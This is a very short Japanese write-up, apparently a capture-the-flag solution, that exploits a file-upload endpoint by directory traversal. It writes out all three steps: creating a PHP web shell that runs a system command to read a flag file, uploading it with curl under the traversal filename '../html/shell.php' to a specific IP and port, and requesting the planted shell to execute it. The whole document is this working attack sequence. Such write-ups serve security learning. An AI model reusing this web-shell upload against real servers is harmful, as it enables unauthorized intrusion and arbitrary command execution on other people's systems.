ペイロードを作成し、ディレクトリトラバーサル攻撃をする。

以下の順で実行すればOK。

```bash
echo '<?php system("cat /flag-*.txt"); ?>' > shell.php
curl -X POST http://34.170.146.252:38378 -F "file=@shell.php;filename=../html/shell.php"
curl http://34.170.146.252:38378/shell.php
```